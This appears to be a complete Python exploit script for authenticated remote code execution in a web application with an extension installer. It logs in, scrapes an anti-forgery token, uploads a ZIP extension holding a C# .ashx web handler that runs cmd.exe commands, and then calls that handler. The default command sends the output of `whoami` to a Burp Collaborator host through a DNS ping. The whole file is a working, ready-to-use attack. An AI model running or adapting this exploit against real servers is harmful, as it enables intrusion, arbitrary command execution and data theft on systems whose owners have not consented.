import base64
import re
import requests
import random
import string
import zipfile

exploit_header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
}
# proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
proxy = {}
def rand_text_hex(length):
    return ''.join(random.choice('0123456789abcdef') for _ in range(length))
def rand_text_alpha_lower(length):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
def rand_text_alpha(length):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

plugin_guid = '-'.join([rand_text_hex(a) for a in [8, 4, 4, 4, 12]])
payload_ashx = f"{rand_text_alpha_lower(8)}.ashx"
payload_handler_class = rand_text_alpha(8)
payload_psi_var = rand_text_alpha(8)
session = requests.Session()

def GetAntiForgeryToken(url, username, password):
    resp = session.get(url=url + "/Administration", auth=(username, password), verify=False, headers=exploit_header, proxies=proxy)
    antiForgeryToken = re.search(r'"antiForgeryToken"\s*:\s*"([a-zA-Z0-9+/=]+)"', resp.text).group(1)
    return antiForgeryToken

def CreateExtension(command):
    command = command.replace("\\", "\\\\\\\\")
    payload_data = f'''<% @ WebHandler Language="C#" Class="{payload_handler_class}" %>
using System;
using System.Web;
using System.Diagnostics;
public class {payload_handler_class} : IHttpHandler
{{
  public void ProcessRequest(HttpContext ctx)
  {{
    ProcessStartInfo {payload_psi_var} = new ProcessStartInfo();
    {payload_psi_var}.FileName = "cmd.exe";
    {payload_psi_var}.Arguments = "/c {command}";
    {payload_psi_var}.RedirectStandardOutput = true;
    {payload_psi_var}.UseShellExecute = false;
    Process.Start({payload_psi_var});
  }}
  public bool IsReusable {{ get {{ return true; }} }}
}}'''
    manifest_data = f'''<?xml version="1.0" encoding="utf-8"?>
<ExtensionManifest>
  <Version>1</Version>
  <Name>{rand_text_alpha_lower(8)}</Name>
  <Author>{rand_text_alpha_lower(8)}</Author>
  <ShortDescription>{rand_text_alpha_lower(8)}</ShortDescription>
  <Components>
    <WebServiceReference SourceFile="{payload_ashx}"/>
  </Components>
</ExtensionManifest>'''
    zip_resources = zipfile.ZipFile('resources.zip', 'w')
    zip_resources.writestr(f"{plugin_guid}/Manifest.xml", manifest_data)
    zip_resources.writestr(f"{plugin_guid}/{payload_ashx}", payload_data)
    zip_resources.close()
    return zip_resources

def UploadExtension(url, anti_forgery_token):
    with open('resources.zip', 'rb') as f:
        zip_data = f.read()
    zip_data_base64 = base64.b64encode(zip_data).decode()
    headers = {
        "X-Anti-Forgery-Token": anti_forgery_token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
    }
    url = url + "/Services/ExtensionService.ashx/InstallExtension"
    response = session.post(url=url, data=f"[\"{zip_data_base64}\"]", headers=headers, verify=False, proxies=proxy)
    if response.status_code == 200:
        print(f"Uploaded Extension: {plugin_guid}")

def TriggerPayload(url):
    url = url + f"/App_Extensions/{plugin_guid}/{payload_ashx}"
    session.get(url=url, verify=False, proxies=proxy)

if __name__ == "__main__":
    username = "cvetest"
    password = "cvetest@2023"
    target = "http://1.2.3.4"
    command = "ping `whoami`.7jr9gk6gtnstix33jp6181eu2l8cw1.burpcollaborator.net"
    anti_forgery_token = GetAntiForgeryToken(target, username, password)
    zip_resources = CreateExtension(command)
    UploadExtension(target, anti_forgery_token)
    TriggerPayload(target)
